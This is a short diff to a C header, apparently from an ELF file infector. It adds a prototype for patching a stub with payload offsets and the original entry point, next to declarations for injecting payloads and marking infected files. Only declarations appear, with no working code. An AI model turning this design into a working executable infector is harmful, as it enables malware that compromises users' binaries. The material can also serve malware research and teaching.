@@ -12,5 +12,6 @@ int inject_payload(void *map, size_t mapsize, ElfInfo *info, unsigned char *payl
 
 int write_infected_file(const char *output_path, void *map, size_t size);
 int already_infected(void *map, ElfInfo *info);
+void patch_stub(unsigned char *stub, size_t stub_size, uint64_t payload_rel_off, uint64_t payload_size, uint64_t old_entry_rel_off);
 
 #endif
